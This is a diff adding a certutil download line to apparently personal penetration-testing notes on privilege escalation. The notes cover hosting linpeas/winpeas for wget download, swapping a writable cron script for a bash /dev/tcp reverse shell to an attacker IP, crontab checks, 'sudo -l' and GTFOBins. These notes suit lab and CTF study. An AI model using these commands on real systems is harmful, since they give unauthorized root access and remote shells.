@@ -134,3 +134,5 @@ NOTE
 if you get a shell but don't have much auth and you want to scan machine to see machine details and files and folder you can use 'linpeas.sh' or 'winpeas' for window by downloads it from github then host a web server in order to install it on target machine using tools like wget.
 - in some case target have a script file that automate stuff automatically and that file have a permission that user don't so we can take advantage of that scipt by changing the content of the script into a reverse shell script like 'bash -i >& /dev/tcp/10.0.2.4/8081 0>&1' this is a one line reverse shell script that give out root and also you can check if that file is automate or not in crontab 'crontab -l', 'crontab -u root -l'or systemctl 'systemctl list-timers' if you can't find it then try a tools like pspy by downlaod it from github
 - if you log in as low prev user then type 'history' to check history and type 'sudo -l' to find if any command we can run with sudo with out password. search google 'gtfobins', it a website that tell you many prev escalations way.
+
+- use 'certutil -urlcache -f http://<ip>/<file>'
